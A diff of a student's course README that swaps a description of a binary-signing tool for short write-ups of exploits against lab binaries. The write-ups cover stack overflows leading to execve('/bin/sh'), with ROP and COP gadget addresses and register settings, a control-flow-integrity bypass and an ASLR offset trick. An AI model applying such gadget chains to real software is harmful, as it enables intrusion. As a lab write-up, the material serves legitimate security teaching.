@@ -1,25 +1,51 @@
 Name : Ryou Sungmin
 Student ID : 2018147553
 Description :
-Program has structures which are t_signtool.
-t_signtool has information about file pointers, file names, excutable section buffer and length.
 
-After initiating t_signtool, program start to parse arguments.
-In parser, it checks argument options and set file names.
+warmup :
+Use stack overflow vulnerability to change process flow
+It start to call execve "/bin/sh".
 
-After parsing, program open files.
-After open files, program parse excutable section and save it to "char \*text" buffer.
-Program throws error while opening and reading file, parsing, allocating has problems.
+exploitme :
+Use stack overflow vulnerability to change process flow.
+To call execve, I use syscall with
+rax : 0x3B, rdi : "/bin/sh", rsi : NULL, rdx : NULL
+To put this value to register, I use ROP.
+Overflow stack from ret with
+0x401260 : rsi = 0
+0x4012e8 : pop rdx
+0x402004 : "/bin/sh"
+0x401270 : rax = 0
+0x401324 : rax += rdx
+0x4011e0 : rdi = rax
+0x4012d0 : rdx = 0
+0x401270 : rax = 0
+0x4012b0 : rax += 0x3b
+0x40134c : syscall
 
-After read excutable section, program start to sign / verify files.
+exploitme-safestack :
+Use stack overflow vulnerability to change process flow.
+To call execve, I use syscall with
+rax : 0x3B, rdi : "/bin/sh", rsi : NULL, rdx : NULL
+To put this value to register, I use COP.
+In main, It calls rcx register and loop.
+So I overwrite memory with
+0x402b40 : rax = 0
+0x402b80 : rax = 0x3b
+0x402ac0 : rax = "/bin/sh"
+0x402c30 : syscall2 garget (rsi = '/bin/sh', rdi = 0x3b)
 
-sign :
-First, program make md by hashing excutable section to RSA-256.
-And with the private key, program start to make signature.
-After make signature, program make new binary file which has section .signature with signature.
+exploitme-safestack-cfi :
+In this case, I can only move to instruction which is bigger than 0x402f40
+I check indirect instruction flow and than I overwrite memory with
+0x402f50 : rax = 0x39
+0x402f40 _ 2 : rax += 1
+0x402f40 _ 2 : rax += 1
+0x402f48 : rax = "/bin/sh"
+0x402f58 : syscall
 
-verify :
-First, program make md by hashing excutable section to RSA-256.
-Then program parse section .signature.
-And with the public key, program start to verify signature.
-Program prints status of verify binary file to standard output.
+exploitme-safestack-cfi-aslr :
+In this case, I cannot know funtion addr because of aslr.
+So I use addr1 argument in py file.
+addr1 will be the criteria and diff between starting addr and 0x402f40 is 0x190
+I use same instruction in exploitme-safestack-cfi, but I sub 0x402f40 and add (addr1 + 0x190) to exploit
